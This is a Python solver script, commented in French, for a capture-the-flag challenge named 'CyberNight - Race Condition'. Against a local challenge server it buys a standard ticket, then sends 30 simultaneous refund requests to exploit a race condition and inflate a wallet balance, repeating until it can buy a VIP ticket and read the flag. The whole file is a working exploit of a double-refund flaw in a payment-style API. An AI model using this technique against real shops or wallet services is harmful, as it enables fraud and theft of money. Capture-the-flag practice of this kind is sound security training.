#!/usr/bin/env python3
"""Solve du challenge CyberNight - Race Condition."""

import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://127.0.0.1:8080"  # Remplacer par l'URL du challenge
session = requests.Session()


def post(path, data):
    return session.post(f"{URL}{path}", json=data, timeout=15)


# 1. Initialiser la session du joueur
wallet = session.get(f"{URL}/api/wallet", timeout=15).json()
print(f"Solde initial : {wallet['balance']} crédits")

# 2. Acheter un billet Standard et tenter plusieurs remboursements
for tour in range(1, 6):
    if wallet["balance"] >= 150:
        break

    achat = post("/api/buy", {"ticket_type": "standard"})
    achat.raise_for_status()
    billet = achat.json()["ticket"]["id"]

    def rembourser(_):
        return post("/api/refund", {"ticket_id": billet}).status_code

    with ThreadPoolExecutor(max_workers=30) as pool:
        resultats = list(pool.map(rembourser, range(30)))

    wallet = session.get(f"{URL}/api/wallet", timeout=15).json()
    print(f"Tour {tour} : {resultats.count(200)} remboursements acceptés, solde = {wallet['balance']}")

# 3. Acheter le VIP et lire le flag
if wallet["balance"] >= 150:
    vip = post("/api/buy", {"ticket_type": "vip"})
    vip.raise_for_status()
    recompense = session.get(f"{URL}/api/reward", timeout=15)
    recompense.raise_for_status()
    print("FLAG :", recompense.json()["flag"])
else:
    print("Échec : relancer le script avec une nouvelle session.")
